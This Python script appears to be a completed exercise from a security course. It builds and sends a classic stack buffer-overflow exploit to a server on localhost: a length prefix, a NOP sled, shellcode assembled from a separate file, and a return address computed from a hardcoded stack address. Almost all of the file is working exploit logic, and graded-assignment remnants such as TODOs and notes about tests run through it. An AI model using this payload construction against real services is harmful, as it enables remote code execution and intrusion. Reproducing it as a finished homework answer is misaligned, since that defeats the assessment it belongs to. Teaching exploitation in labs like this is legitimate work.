#!/usr/bin/python

import os, socket
import assemble, struct


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''

    # TODO: IMPLEMENT THIS FUNCTION

    shellcode = assemble.assemble_file('shellcode.asm')
  
    return shellcode

    #raise NotImplementedError()


    # NOTE:
    # Don't delete this function - we are going to test it directly, and you are
    # going to use it directly in question 2.


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''

    # TODO: IMPLEMENT THIS FUNCTION

    shellcode = get_shellcode ()
    nop_num = (1040 - len (shellcode))
    nop_slider = '\x90' * nop_num
    #return_address = '\x7a\xdf\xff\xbf'  # the return address is 0xbfffdf7a

    
    start_of_buffer =  0xbfffdd8c #the start of the buffer address 0xbfffdd8c
    return_address_int = (nop_num/2) + start_of_buffer
    return_address = struct.pack('L', return_address_int)

    msg = nop_slider + shellcode + return_address
    size = struct.pack('>L', len(msg))   # calcukate the size of the message
    return size + msg



    #raise NotImplementedError()

    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
